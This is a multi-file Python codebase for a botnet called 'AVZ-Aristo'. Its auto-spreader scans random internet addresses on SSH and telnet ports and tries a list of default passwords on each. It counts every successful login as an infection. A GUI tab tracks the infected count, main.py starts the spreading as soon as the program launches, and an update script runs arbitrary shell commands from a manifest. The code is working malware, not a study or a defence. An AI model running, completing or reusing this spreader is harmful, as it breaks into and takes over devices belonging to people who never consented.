files.utils/logger.py:
import logging
from logging.handlers import RotatingFileHandler
import sys

class AVZLogger:
    def __init__(self, logfile='avz_debug.log'):
        self.logger = logging.getLogger('AVZ')
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
        fh = RotatingFileHandler(logfile, maxBytes=5*1024*1024, backupCount=3)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        self._recent = []

    def _store(self, level, msg):
        self.logger.log(level, msg)
        self._recent.append(msg)
        if len(self._recent) > 200:
            self._recent.pop(0)

    def debug(self, msg): self._store(logging.DEBUG, msg)
    def info(self, msg): self._store(logging.INFO, msg)
    def warning(self, msg): self._store(logging.WARNING, msg)
    def error(self, msg): self._store(logging.ERROR, msg)
    def get_recent(self, n=50): return self._recent[-n:]

logger = AVZLogger()
files.botnet/auto_spreader.py:
import threading
import time
import random
import socket
from utils.logger import logger

class AutoSpreader:
    def __init__(self, threads=500):
        self.threads = threads
        self.running = False
        self.bot_count = 0
        self.lock = threading.Lock()
        self.creds = [
            ('root', 'admin'), ('admin', 'admin'), ('root', 'root'), ('admin', 'password'),
            ('admin', '1234'), ('guest', 'guest'), ('root', 'password'), ('support', 'support'),
            ('ubnt', 'ubnt'), ('admin', '123456'), ('root', '123456'), ('admin', ''), ('root', '')
        ]
        self.ports = [22, 23]

    def start(self):
        self.running = True
        logger.info(f'AutoSpreader launched with {self.threads} threads')
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()

    def stop(self):
        self.running = False
        logger.info('AutoSpreader halted')

    def _worker(self):
        while self.running:
            ip = f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}'
            for port in self.ports:
                if not self.running: return
                if self._is_port_open(ip, port):
                    logger.debug(f'Open {ip}:{port}')
                    for user, pwd in self.creds:
                        if not self.running: return
                        if self._try_login(ip, port, user, pwd):
                            logger.info(f'INFECTED {ip}:{port} with {user}:{pwd}')
                            with self.lock:
                                self.bot_count += 1
                            break
            time.sleep(0.001)

    def _is_port_open(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.05)
        try:
            s.connect((ip, port))
            s.close()
            return True
        except:
            return False

    def _try_login(self, ip, port, user, pwd):
        if port == 22:
            return self._ssh_login(ip, user, pwd)
        elif port == 23:
            return self._telnet_login(ip, user, pwd)
        return False

    def _ssh_login(self, ip, user, pwd):
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=22, username=user, password=pwd, timeout=3, banner_timeout=3, allow_agent=False, look_for_keys=False)
            client.exec_command('id', timeout=5)
            client.close()
            return True
        except Exception as e:
            logger.debug(f'SSH fail {ip}:{user} - {e}')
            return False

    def _telnet_login(self, ip, user, pwd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, 23))
            time.sleep(0.2)
            s.recv(4096)
            s.send(user.encode() + b'\n')
            time.sleep(0.3)
            s.recv(4096)
            s.send(pwd.encode() + b'\n')
            time.sleep(0.5)
            s.send(b'id\n')
            time.sleep(0.5)
            out = s.recv(4096)
            s.close()
            return b'uid=' in out
        except Exception as e:
            logger.debug(f'Telnet fail {ip}:{user} - {e}')
            return False
files.botnet/spreader.py:
from utils.logger import logger

def exploit_ssh(ip, user, pwd):
    import paramiko
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=22, username=user, password=pwd, timeout=3, banner_timeout=3)
        client.exec_command('id')
        client.close()
        return True
    except:
        return False

def exploit_telnet(ip, user, pwd):
    import socket, time
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, 23))
        time.sleep(0.2)
        s.recv(1024)
        s.send(user.encode()+b'\n')
        time.sleep(0.3)
        s.recv(1024)
        s.send(pwd.encode()+b'\n')
        time.sleep(0.5)
        s.send(b'id\n')
        time.sleep(0.5)
        out = s.recv(1024)
        s.close()
        return b'uid=' in out
    except:
        return False
files.gui/tabs/bot_auto_tab.py:
import tkinter as tk
from tkinter import ttk
import threading
from botnet.auto_spreader import AutoSpreader
from utils.logger import logger

class BotAutoTab(ttk.Frame):
    def __init__(self, parent, spreader):
        super().__init__(parent)
        self.spreader = spreader
        self.status_var = tk.StringVar(value='Running' if spreader.running else 'Stopped')
        self.count_var = tk.StringVar(value='Infected: 0')
        self.create_widgets()
        self.update_display()

    def create_widgets(self):
        ttk.Label(self, text='AUTO INFECTION', font=('Arial', 14, 'bold')).pack(pady=5)
        btn_frame = ttk.Frame(self)
        btn_frame.pack(pady=5)
        ttk.Button(btn_frame, text='START', command=self.start).pack(side='left', padx=2)
        ttk.Button(btn_frame, text='STOP', command=self.stop).pack(side='left', padx=2)
        ttk.Label(self, textvariable=self.status_var).pack()
        ttk.Label(self, textvariable=self.count_var).pack()
        self.log_box = tk.Text(self, height=15, width=90, state='disabled')
        self.log_box.pack(padx=5, pady=5, fill='both', expand=True)

    def start(self):
        if not self.spreader.running:
            self.spreader.running = True
            threading.Thread(target=self.spreader.start, daemon=True).start()
            self.status_var.set('Running')
            logger.info('Spread started via GUI')

    def stop(self):
        self.spreader.stop()
        self.status_var.set('Stopped')

    def update_display(self):
        self.count_var.set(f'Infected: {self.spreader.bot_count}')
        recent = logger.get_recent(10)
        self.log_box.config(state='normal')
        self.log_box.delete(1.0, tk.END)
        for msg in recent:
            self.log_box.insert(tk.END, msg + '\n')
        self.log_box.see(tk.END)
        self.log_box.config(state='disabled')
        self.after(1000, self.update_display)

import tkinter as tk
from tkinter import ttk
from gui.tabs.bot_auto_tab import BotAutoTab
from utils.logger import logger

class AVZApp(tk.Tk):
    def __init__(self, spreader):
        super().__init__()
        self.title('AVZ-Aristo v72.0 FINAL PURGE')
        self.geometry('1100x700')
        notebook = ttk.Notebook(self)
        notebook.pack(fill='both', expand=True)
        notebook.add(BotAutoTab(notebook, spreader), text='Infection')
        logger.info('GUI initialized')
files.main.py:
from gui.app import AVZApp
from botnet.auto_spreader import AutoSpreader
from utils.logger import logger

def main():
    logger.info('Starting AVZ-Aristo...')
    spreader = AutoSpreader()
    spreader.start()  # автостарт заражения при запуске
    app = AVZApp(spreader)
    app.mainloop()

if __name__ == '__main__':
    main()
files.update.py:
import json
import subprocess
import sys
import shutil
from pathlib import Path
from utils.secrets_manager import SecretsManager

ROOT = Path(__file__).parent.absolute()
MANIFEST_PATH = ROOT / 'manifest.json'
ARCHIVE_DIR = ROOT / 'archive'

def apply_cleanup(manifest):
    if 'cleanup' not in manifest:
        return
    cleanup = manifest['cleanup']
    # удаление
    for pattern in cleanup.get('delete', []):
        for f in ROOT.glob(pattern):
            if f.is_file():
                f.unlink()
                print(f'[🧹] Deleted {f}')
            elif f.is_dir():
                shutil.rmtree(f)
                print(f'[🧹] Removed directory {f}')
    # архивация
    for pattern in cleanup.get('archive', []):
        for f in ROOT.glob(pattern):
            if f.is_file():
                ARCHIVE_DIR.mkdir(exist_ok=True)
                shutil.move(str(f), str(ARCHIVE_DIR / f.name))
                print(f'[📦] Archived {f}')

def apply_files(manifest):
    for fname, content in manifest['files'].items():
        dest = ROOT / fname
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_text(content, encoding='utf-8')

def run_post_install(manifest):
    if 'post_install' in manifest:
        subprocess.run(manifest['post_install'], shell=True, cwd=ROOT)

def git_push(description):
    secrets = SecretsManager()
    token = secrets.get('github_token')
    if not token:
        print('[!] GitHub token not set, skipping push')
        return
    remote = f'https://Aristocrat702:{token}@github.com/Aristocrat702/avz.git'
    subprocess.run(['git', 'remote', 'set-url', 'origin', remote], cwd=ROOT, check=True)
    subprocess.run(['git', 'add', '.'], cwd=ROOT, check=True)
    subprocess.run(['git', 'commit', '-m', description], cwd=ROOT, check=True)
    subprocess.run(['git', 'push', 'origin', 'main'], cwd=ROOT, check=True)
    print('[✔] Pushed to GitHub')

def main():
    if not MANIFEST_PATH.exists():
        print('No manifest.json found. Nothing to update.')
        sys.exit(0)
    with open(MANIFEST_PATH) as f:
        manifest = json.load(f)
    print(f"Applying {manifest['manifest']}...")
    # Очистка мусора ДО записи новых файлов
    apply_cleanup(manifest)
    apply_files(manifest)
    run_post_install(manifest)
    # Перенос самого манифеста в архив
    ARCHIVE_DIR.mkdir(exist_ok=True)
    shutil.move(str(MANIFEST_PATH), str(ARCHIVE_DIR / f"applied_{manifest['manifest']}.json"))
    git_push(manifest['description'])
    print('[✔] All updates applied, cleaned and pushed.')

if __name__ == '__main__':
    main()

files..github/workflows/main.yml:
name: AVZ CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Install deps
        run: pip install -r requirements.txt
      - name: Type check
        run: mypy botnet/ engine/ gui/ deploy/ utils/
      - name: Test with coverage
        run: pytest --cov=. --cov-report=xml
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage.xml
files.post_install: pip install -r requirements.txt && cd fast_scanner && maturin develop --release 2>/dev/null || echo 'Rust scanner not built (optional)'
